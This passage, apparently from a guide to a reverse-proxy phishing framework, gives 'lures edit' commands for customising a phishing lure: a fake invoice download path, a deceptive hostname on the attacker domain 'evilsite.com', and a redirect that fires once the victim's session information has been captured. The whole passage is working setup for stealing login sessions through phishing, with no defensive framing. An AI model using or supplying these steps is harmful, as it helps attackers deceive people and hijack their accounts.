Customize a lure

```cs
lures edit <id> path <URI_PATH>
lures edit 0 path /download/invoice/00554/
```

To change the hostname. This hostname must always end with the configured domain (evilsite.com)

```cs
lures edit 0 hostname this.is.a.real.website.evilsite.com
```

Add a Redirect URL. This URL will be opened once we have retrieved the victim's session information.

```cs
lures edit 0 redirect_url https://otherwebsite.com
```
